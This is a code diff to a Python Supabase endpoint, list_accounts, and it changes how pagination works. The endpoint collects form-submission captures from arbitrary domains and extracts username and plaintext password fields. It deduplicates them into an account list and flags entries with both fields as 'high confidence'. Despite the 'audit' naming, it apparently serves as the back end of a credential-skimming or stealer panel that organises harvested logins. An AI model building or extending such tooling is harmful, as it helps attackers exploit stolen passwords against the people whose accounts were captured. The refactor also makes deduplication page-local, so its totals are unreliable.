@@ -123,33 +123,46 @@ async def list_accounts(
     Groups fields by domain + user + password to provide a unique account list.
     """
     try:
-        # 1. Fetch credentials with base filters
-        query = supabase_audit.table("extracted_credentials").select("*").order("timestamp", desc=True)
+        # 1. Fetch paginated captures first to prevent massive data loading
+        start = (page - 1) * page_size
+        end = start + page_size - 1
         
-        if domain:
+        # Determine capture type for credentials
+        query = supabase_audit.table("audit_captures").select("id, domain, timestamp, url", count="exact").in_("capture_type", ["FORM_SUBMIT"]).order("timestamp", desc=True)
+        
+        if domain and domain != "ALL":
             query = query.ilike("domain", f"%{domain}%")
-        if search:
-            query = query.or_(f"domain.ilike.%{search}%,field_value.ilike.%{search}%")
             
-        response = query.execute()
+        if search:
+            query = query.or_(f"domain.ilike.%{search}%,url.ilike.%{search}%")
+            
+        capture_res = query.range(start, end).execute()
         
-        if not response.data:
-            return {"data": [], "total": 0}
+        if not capture_res.data:
+            return {"data": [], "total": 0, "page": page, "page_size": page_size}
+            
+        capture_ids = [c["id"] for c in capture_res.data]
+        capture_map = {c["id"]: c for c in capture_res.data}
+        total_count = capture_res.count if capture_res.count else 0
+        
+        # 2. Fetch credentials for these captures
+        creds_res = supabase_audit.table("extracted_credentials").select("*").in_("audit_capture_id", capture_ids).execute()
 
-        # 2. First pass: Group by capture_id to get raw field sets
+        # 3. Group by capture_id
         capture_groups = {}
-        for cred in response.data:
+        for cred in creds_res.data:
             cid = cred["audit_capture_id"]
             if cid not in capture_groups:
+                cap_info = capture_map.get(cid, {})
                 capture_groups[cid] = {
-                    "domain": cred["domain"],
-                    "timestamp": cred["timestamp"],
-                    "url": cred["url"],
+                    "domain": cred["domain"] or cap_info.get("domain", "Unknown"),
+                    "timestamp": cred.get("timestamp") or cap_info.get("timestamp"),
+                    "url": cred.get("url") or cap_info.get("url", ""),
                     "fields": {}
                 }
             capture_groups[cid]["fields"][cred["field_name"].lower()] = cred["field_value"]
 
-        # 3. Second pass: Deduplicate by domain + user + pass
+        # 4. Deduplicate by domain + user + pass
         unique_accounts = {}
         user_keys = ['user', 'email', 'login', 'id', 'account', 'phone']
         pass_keys = ['pass', 'pwd', 'secret']
@@ -164,8 +177,6 @@ async def list_accounts(
                 elif any(uk in k for uk in user_keys):
                     user = v
             
-            # Create a unique key for deduplication
-            # We normalize the domain and identifiers
             account_key = f"{data['domain'].lower()}|{user.lower()}|{password}"
             
             if account_key not in unique_accounts:
@@ -178,30 +189,23 @@ async def list_accounts(
                     "last_seen": data["timestamp"],
                     "latest_url": data["url"],
                     "is_high_confidence": (user != "Unknown" and password != "Unknown"),
-                    "id": cid # Use the latest capture ID as reference
+                    "id": cid
                 }
             else:
                 unique_accounts[account_key]["capture_count"] += 1
                 unique_accounts[account_key]["all_fields"].update(data["fields"])
                 unique_accounts[account_key]["is_high_confidence"] = \
                     unique_accounts[account_key]["is_high_confidence"] or (user != "Unknown" and password != "Unknown")
-                # Keep the latest timestamp
                 if data["timestamp"] > unique_accounts[account_key]["last_seen"]:
                     unique_accounts[account_key]["last_seen"] = data["timestamp"]
                     unique_accounts[account_key]["latest_url"] = data["url"]
 
-        # 4. Convert to list and sort by last_seen
         accounts = list(unique_accounts.values())
         accounts.sort(key=lambda x: x["last_seen"], reverse=True)
 
-        # 5. Handle pagination
-        start = (page - 1) * page_size
-        end = start + page_size
-        paginated_accounts = accounts[start:end]
-
         return {
-            "data": paginated_accounts,
-            "total": len(accounts),
+            "data": accounts,
+            "total": total_count,
             "page": page,
             "page_size": page_size
         }
